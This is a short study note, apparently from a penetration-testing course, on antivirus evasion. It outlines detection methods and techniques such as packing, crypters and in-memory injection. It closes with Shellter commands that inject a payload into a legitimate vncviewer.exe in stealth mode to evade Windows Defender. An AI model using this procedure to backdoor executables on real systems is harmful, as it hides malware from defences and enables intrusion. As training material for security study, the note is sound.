---
up: "[[Obfuscation]]"
---

# AV Evasion with Shellter

- How to avoi dvery basic signature based AV
- Defense Evasion consists of techniques used to avoid detection.
	- uninstalling/disabling security software
	- obfuscating/encrypting data and scripts
	- leverage and abuse trusted processes to hide malware

## AV Detection Methods

1. Signature based
	- unique sequence of bytes that identifies malware
	- need to check the payload doesn't match any known signature
2. Heuristic-based 
	- Relies on rules or decisions to determine if it is malicious
	- Also looks for specific pattern in code or program calls
3. Behavior based 
	- Monitor the behavior

## AV Evasion Techniques

### On disk evasion techniques

- Obfuscation
	- process of concealing something important
- Encoding
	- changing data into a new format
- Packing
	- Generate executable with new binary structure with a smaller size
- Crypters
	- Encrypt code or payloads and decrypt it in memory.
	- Decryption function is stored in a stub

### In memory evasion techniques

- Focuses on manipulating memory and does not write files to disk
- Injects payload into a process by leveraging various Windows APIs
- Payload is then executed in memory in a separate thread

## Demonstration

Evade Windows Defender on a Windows 7 system using [[Shellter]]:

```bash
# package is a windows package
sudo apt install shellter
# needs wine 32bit
dpkg --add-architecture i386
sudo apt install wine32
$ cd /usr/share/windows-resources/shellter
$ sudo wine shellter.exe
$ cp /usr/share/windows-binaries/vncviewer.exe .
$ sudo wine shellter.exe
: A
: ~/vncviewer.exe
Stealth Mode: Y
# custom for msfvenom
Payload: L
: 1
```
